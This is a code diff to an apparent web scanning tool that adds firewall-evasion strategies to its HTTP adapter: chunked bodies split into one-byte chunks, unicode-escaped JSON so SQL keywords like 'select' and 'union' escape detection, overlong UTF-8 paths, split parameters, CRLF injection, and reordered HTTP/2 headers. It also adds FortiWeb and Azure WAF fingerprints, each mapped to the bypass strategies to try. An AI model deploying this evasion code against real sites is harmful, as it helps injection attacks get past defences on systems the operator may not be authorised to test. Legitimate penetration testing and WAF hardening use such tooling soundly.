@@ -195,12 +195,91 @@ class WAFBypassAdapter(HTTPAdapter):
             try:
                 parsed2 = urlparse(request.url)
                 if parsed2.query:
-                    # Duplicate the first param with a slight variation
                     first_pair = parsed2.query.split("&")[0]
                     request.url = request.url + "&" + first_pair
                 else:
                     junk_param = f"_={random.randint(1000, 9999)}"
                     request.url += "?" + junk_param
+            except Exception:
+                pass
+
+        # 7. Chunked body encoding (_evasion_chunked flag)
+        if self._get_flag("_evasion_chunked") and request.body:
+            try:
+                from websecure.core.evasion import ChunkedBodyBuilder
+                body = (
+                    request.body
+                    if isinstance(request.body, bytes)
+                    else str(request.body).encode("utf-8")
+                )
+                min_c = getattr(self._session_ref, "_chunk_min", 1) if self._session_ref else 1
+                max_c = getattr(self._session_ref, "_chunk_max", 6) if self._session_ref else 6
+                request.body = ChunkedBodyBuilder().build(body, min_chunk=min_c, max_chunk=max_c)
+                request.headers.pop("Content-Length", None)
+                request.headers["Transfer-Encoding"] = "chunked"
+            except Exception:
+                pass
+
+        # 8. JSON unicode escape (_evasion_json_escape flag)
+        if self._get_flag("_evasion_json_escape") and request.body:
+            try:
+                ct = request.headers.get("Content-Type", "")
+                if "json" in ct.lower():
+                    from websecure.core.evasion import JSONUnicodeEscaper
+                    body_s = (
+                        request.body
+                        if isinstance(request.body, str)
+                        else request.body.decode("utf-8", "replace")
+                    )
+                    request.body = JSONUnicodeEscaper().escape_json(body_s).encode("utf-8")
+                    if "Content-Length" in request.headers:
+                        request.headers["Content-Length"] = str(len(request.body))
+            except Exception:
+                pass
+
+        # 9. Overlong UTF-8 path encoding (_evasion_overlong flag)
+        if self._get_flag("_evasion_overlong"):
+            try:
+                from websecure.core.evasion import OverlongUTF8Encoder
+                from urllib.parse import urlsplit, urlunsplit
+                parts    = urlsplit(request.url)
+                new_path = OverlongUTF8Encoder().partial_encode(parts.path, "/<>\"'()")
+                request.url = urlunsplit(parts._replace(path=new_path))
+            except Exception:
+                pass
+
+        # 10. Parameter fragmentation (_evasion_param_frag flag)
+        if self._get_flag("_evasion_param_frag"):
+            try:
+                from websecure.core.evasion import ParamFragmentor
+                from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
+                parts = urlsplit(request.url)
+                if parts.query:
+                    params    = parse_qsl(parts.query, keep_blank_values=True)
+                    fragmentor = ParamFragmentor()
+                    new_params: list = []
+                    for k, v in params:
+                        if len(v) > 4:
+                            new_params.extend(fragmentor.fragment(k, v, n=2))
+                        else:
+                            new_params.append((k, v))
+                    request.url = urlunsplit(parts._replace(query=urlencode(new_params)))
+            except Exception:
+                pass
+
+        # 11. CRLF / newline injection in query string (_evasion_newline flag)
+        if self._get_flag("_evasion_newline"):
+            try:
+                from websecure.core.evasion import CRLFInjector
+                from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
+                parts  = urlsplit(request.url)
+                if parts.query:
+                    params = parse_qsl(parts.query, keep_blank_values=True)
+                    if params:
+                        k, v   = params[0]
+                        # Inject a benign newline-encoded string to probe WAF parsing
+                        params[0] = (k, v + CRLFInjector.CRLF_SEQS[0] + "X-Waf-Test: 1")
+                        request.url = urlunsplit(parts._replace(query=urlencode(params)))
             except Exception:
                 pass
 
@@ -273,7 +352,11 @@ _engine = BypassStrategyEngine()
 
 @BypassStrategyEngine.register("chunked_encoding")
 def _s_chunked(session):
-    session.headers["Transfer-Encoding"] = "chunked"
+    """Chunked body encoding — body is split across variable-size chunks at send time."""
+    session._evasion_chunked = True
+    session._chunk_min       = 3
+    session._chunk_max       = 12
+    # Transfer-Encoding header is set by WAFBypassAdapter.send() after building the body
 
 
 @BypassStrategyEngine.register("content_type_mismatch")
@@ -316,6 +399,8 @@ def _s_hpp(session):
 
 @BypassStrategyEngine.register("json_unicode_escape")
 def _s_json_esc(session):
+    """Unicode-escape JSON string values so WAF keyword patterns miss 'select', 'union', etc."""
+    session._evasion_json_escape = True
     session.headers["Content-Type"] = "application/json; charset=utf-8"
 
 
@@ -374,7 +459,8 @@ def _s_header_variants(session):
 
 @BypassStrategyEngine.register("param_fragmentation")
 def _s_param_frag(session):
-    session.headers["X-Param-Frag"] = "1"
+    """Split query-string parameter values across duplicate keys to confuse WAF parsers."""
+    session._evasion_param_frag = True
 
 
 @BypassStrategyEngine.register("captcha_bypass")
@@ -387,6 +473,53 @@ def _s_captcha_bypass(session):
     enabled when a challenge is encountered during scanning.
     """
     session._captcha_bypass_enabled = True
+
+
+@BypassStrategyEngine.register("overlong_utf8")
+def _s_overlong(session):
+    """Overlong UTF-8 path encoding — encodes special chars as non-canonical multi-byte sequences."""
+    session._evasion_overlong = True
+
+
+@BypassStrategyEngine.register("chunked_small_chunks")
+def _s_chunked_small(session):
+    """Extreme 1-byte chunk encoding — maximum pattern-matching confusion."""
+    session._evasion_chunked = True
+    session._chunk_min       = 1
+    session._chunk_max       = 2
+
+
+@BypassStrategyEngine.register("newline_injection")
+def _s_newline(session):
+    """CRLF/newline injection into query parameters to probe WAF header-parsing."""
+    session._evasion_newline = True
+
+
+@BypassStrategyEngine.register("path_parameter_pollution")
+def _s_path_param_poll(session):
+    """
+    Combine path obfuscation + parameter fragmentation to confuse WAF
+    path-normalisation and parameter-inspection in a single request.
+    """
+    session._evasion_param_frag = True
+    session._bypass_path_suffix = f";{random.choice(['v1','api','ext','cache'])}=1"
+
+
+@BypassStrategyEngine.register("http2_pseudo_header_order")
+def _s_http2_pseudo(session):
+    """
+    HTTP/2 pseudo-header reordering.
+    Sets a flag so curl_cffi / httpx drivers send pseudo-headers in a
+    non-standard order that some WAFs do not expect.
+    """
+    session._evasion_http2_pseudo = True
+    # If curl_cffi is available, prefer it as it exposes header-order control
+    try:
+        if _CURL_CFFI_AVAILABLE:
+            session._use_curl_cffi     = True
+            session._curl_cffi_profile = _resolve_profile("chrome_124")
+    except Exception:
+        pass
 
 
 def build_bypass_session(waf_profile=None) -> WAFBypassSession:
@@ -1570,6 +1703,44 @@ _WAF_SIGNATURES: Dict[str, Dict] = {
         "bypass_strategies": [
             "chunked_encoding", "hpp_duplicate_params",
             "content_type_mismatch",
+        ],
+    },
+    "fortiweb": {
+        "headers": [
+            ("server", r"FortiWeb"),
+            ("x-fw-errcode", r".+"),
+            ("x-cache", r"MISS from FortiWeb"),
+        ],
+        "body": [
+            r"FortiWeb",
+            r"This request is blocked by the Web Application Firewall",
+            r"block-page\.fortiwebcloud\.net",
+        ],
+        "cookies": ["FORTITOKEN"],
+        "status": [403, 400],
+        "bypass_strategies": [
+            "chunked_small_chunks", "overlong_utf8",
+            "double_url_encoding", "unicode_normalization",
+            "path_parameter_pollution", "newline_injection",
+        ],
+    },
+    "azure_waf": {
+        "headers": [
+            ("x-azure-ref", r".+"),
+            ("x-ms-request-id", r".+"),
+            ("server", r"Microsoft-Azure-Application-Gateway"),
+        ],
+        "body": [
+            r"The request is blocked",
+            r"Azure Web Application Firewall",
+            r"RequestId:",
+        ],
+        "cookies": [],
+        "status": [403],
+        "bypass_strategies": [
+            "chunked_encoding", "json_unicode_escape",
+            "http2_pseudo_header_order", "double_url_encoding",
+            "case_sensitivity_bypass", "overlong_utf8",
         ],
     },
 }
